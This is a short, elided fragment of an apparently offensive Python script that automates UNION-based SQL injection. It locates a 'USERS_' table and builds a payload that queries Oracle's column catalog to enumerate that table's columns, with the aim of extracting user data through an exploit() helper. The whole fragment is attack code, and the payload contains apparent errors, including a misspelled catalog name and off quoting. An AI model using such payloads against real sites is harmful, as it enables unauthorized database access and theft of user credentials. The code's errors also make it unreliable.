...
def tableSearch(url):
    ...
    userTable = soup.find(text=re.compile('^USERS\_.*'))
    return userTable

def columnSearch(url, userTable):
    payload = f"' union select column_name, null from all_tab_column where table_name='{userTable}-- -"
    response = exploit(url, payload)
    soup = BeautifulSoup(response, 'html.parser')
